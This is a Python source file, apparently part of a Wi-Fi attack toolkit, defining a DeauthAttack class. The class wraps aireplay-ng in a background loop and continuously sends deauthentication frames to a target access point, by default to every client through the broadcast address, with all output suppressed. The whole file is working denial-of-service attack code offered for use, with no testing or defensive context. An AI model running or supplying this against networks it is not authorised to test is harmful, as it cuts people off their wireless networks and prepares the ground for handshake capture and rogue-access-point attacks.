import threading
import subprocess
from typing import Optional


class DeauthAttack:
    """Continuous deauthentication attack against a target AP."""

    def __init__(self, iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF"):
        self.iface = iface
        self.bssid = bssid
        self.client = client
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._proc: Optional[subprocess.Popen] = None

    def start(self) -> None:
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=3)
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=5)

    def _run(self) -> None:
        while not self._stop_event.is_set():
            try:
                self._proc = subprocess.Popen(
                    [
                        "aireplay-ng",
                        "-0", "10",
                        "-a", self.bssid,
                        "-c", self.client,
                        "--ignore-negative-one",
                        self.iface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._proc.wait(timeout=15)
            except subprocess.TimeoutExpired:
                if self._proc:
                    self._proc.terminate()
            except Exception:
                pass
            if not self._stop_event.is_set():
                self._stop_event.wait(timeout=2)
